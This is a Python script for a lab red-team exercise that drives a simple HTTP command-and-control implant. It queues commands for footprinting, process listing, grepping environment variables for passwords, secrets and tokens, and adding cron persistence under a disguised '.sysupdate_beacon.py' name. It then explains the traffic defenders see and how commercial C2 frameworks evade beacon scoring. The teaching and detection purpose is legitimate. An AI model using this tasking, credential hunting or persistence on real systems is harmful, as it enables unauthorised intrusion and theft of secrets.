#!/usr/bin/env python3
"""
C2 post-exploitation demo — lab red-team exercise.

Demonstrates:
  1. Session establishment — implant beacons in, server assigns a session ID
  2. Post-exploitation — operator sends commands, reads output
     - hostname / id / whoami (footprint)
     - ps aux (process enumeration)
     - env (credential/secret discovery)
     - bash one-liner persistence (cron via echo)
  3. Beaconing telemetry — what a defender sees on the wire
  4. Detection artifacts — what Sysmon/Zeek would log

> Only deploy C2 implants on systems you own or have explicit written authorisation to test.
> This is a simulated exercise. The target container is intentionally set up for this lab.

Usage:
    python3 c2_demo.py          # full demo
"""
from __future__ import annotations

import json
import sys
import time
import urllib.error
import urllib.request

C2 = "http://c2-server:5000"
DIVIDER = "─" * 64


def api_get(path: str) -> object:
    try:
        with urllib.request.urlopen(f"{C2}{path}", timeout=5) as r:
            return json.loads(r.read())
    except urllib.error.URLError as e:
        return {"error": str(e)}


def api_post(path: str, data: dict) -> object:
    body = json.dumps(data).encode()
    req = urllib.request.Request(
        f"{C2}{path}", data=body,
        headers={"Content-Type": "application/json"}, method="POST"
    )
    try:
        with urllib.request.urlopen(req, timeout=5) as r:
            return json.loads(r.read())
    except urllib.error.URLError as e:
        return {"error": str(e)}


def wait_for_session(max_wait: float = 15.0) -> str | None:
    """Block until at least one session appears."""
    deadline = time.time() + max_wait
    while time.time() < deadline:
        sessions = api_get("/api/sessions")
        if isinstance(sessions, list) and sessions:
            return sessions[0]["sid"]
        time.sleep(0.5)
    return None


def run_task(sid: str, cmd: str, wait: float = 12.0) -> str:
    """Queue a task and wait for a NEW result (tracks result count before queuing)."""
    current = api_get(f"/api/results/{sid}")
    prev_count = len(current) if isinstance(current, list) else 0

    api_post("/api/task", {"sid": sid, "cmd": cmd})
    deadline = time.time() + wait
    while time.time() < deadline:
        results = api_get(f"/api/results/{sid}")
        if isinstance(results, list) and len(results) > prev_count:
            return results[-1].get("output", "(no output)")
        time.sleep(0.3)
    return "(timeout — implant did not respond)"


def demo() -> int:
    print("=" * 64)
    print("C2 Post-Exploitation Demo")
    print("Technique: HTTP beacon + task/result channel")
    print("=" * 64)

    # ── Step 1: Wait for implant to check in ──────────────────────────────
    print("\n[Step 1] Waiting for implant beacon...")
    print()
    sid = wait_for_session(max_wait=20)
    if not sid:
        print("  ✗ No session — is 'make up' running (implant container)?")
        return 1

    sessions = api_get("/api/sessions")
    sess = next((s for s in sessions if s["sid"] == sid), {})
    print(f"  ✓ Session established: {sid}")
    print(f"    hostname: {sess.get('hostname')}")
    print(f"    user:     {sess.get('username')}")
    print(f"    os:       {sess.get('os')}")
    print(f"    pid:      {sess.get('pid')}")
    print(f"    ip:       {sess.get('ip')}")
    print()
    print("  The implant is beaconing every ~5 seconds.  The C2 server")
    print("  sees a POST /api/beacon every interval — that's the signal a")
    print("  defender hunts (fixed interval, byte-stable, internal→external).")

    # ── Step 2: Post-ex — footprint ───────────────────────────────────────
    print(f"\n{DIVIDER}")
    print("[Step 2] Post-exploitation — footprint")
    print()
    for cmd in ["id", "hostname && uname -a"]:
        out = run_task(sid, cmd)
        print(f"  $ {cmd}")
        for line in out.splitlines():
            print(f"    {line}")
        print()

    # ── Step 3: Post-ex — process and env enumeration ─────────────────────
    print(DIVIDER)
    print("[Step 3] Post-exploitation — process + env enumeration")
    print()
    out = run_task(sid, "ps aux | head -15")
    print("  $ ps aux | head -15")
    for line in out.splitlines():
        print(f"    {line}")
    print()

    out = run_task(sid, "env | grep -i 'pass\\|secret\\|key\\|token\\|api' | head -10")
    print("  $ env | grep -i 'pass|secret|key|token|api'")
    if out.strip():
        for line in out.splitlines():
            print(f"    {line}")
    else:
        print("    (no credentials in env — good defensive hygiene)")
    print()

    # ── Step 4: Persistence ────────────────────────────────────────────────
    print(DIVIDER)
    print("[Step 4] Post-exploitation — persistence via cron")
    print()
    persist_cmd = r"(crontab -l 2>/dev/null; echo '@reboot python3 /tmp/.sysupdate_beacon.py') | crontab -"
    print(f"  $ {persist_cmd}")
    out = run_task(sid, persist_cmd)
    print(f"    {out or '(success — crontab written)'}")
    print()
    out = run_task(sid, "crontab -l 2>/dev/null")
    print("  $ crontab -l")
    for line in out.splitlines():
        print(f"    {line}")
    print()
    print("  Cron persistence is one of the most common real-world techniques.")
    print("  Detection: crontab changes in Sysmon (Linux), auditd, or osquery.")

    # ── Step 5: Defender artifacts ────────────────────────────────────────
    print(f"\n{DIVIDER}")
    print("[Step 5] Defender artifacts — what the SOC sees")
    print()
    print("  HTTP traffic (Zeek would log each /api/beacon request):")
    print(f"    {sess.get('ip')} → c2-server:5000  POST /api/beacon  ~5s interval")
    print(f"    Content-Type: application/json  (not obfuscated — cleartext JSON)")
    print()
    print("  RITA beacon scoring (from defensive lab 12):")
    print("    • Fixed interval (~5s with ±1s jitter) → high CV score")
    print("    • Consistent request size → high byte-consistency score")
    print("    • Many short connections → high count score")
    print("    → Beacon score ≈ 85–92 — easily flagged")
    print()
    print("  What Sliver/Cobalt Strike do differently:")
    print("    • Protocol: DNS, HTTPS (cert pinned), SMB named-pipes")
    print("    • Jitter: wide variance in interval (harder to score)")
    print("    • Malleable C2: custom HTTP headers + randomised user-agent")
    print("    • Sleep: long beacon intervals (hours) to evade RITA")
    print()
    print("  This demo's HTTP beaconing is intentionally simple so you can read it.")
    print("  The defensive goal remains the same: hunt for periodicity + byte consistency.")

    print(f"\n{'=' * 64}")
    print("Demo complete — C2 session, post-ex, persistence, and artifacts")
    print(f"{'=' * 64}\n")
    return 0


if __name__ == "__main__":
    sys.exit(demo())
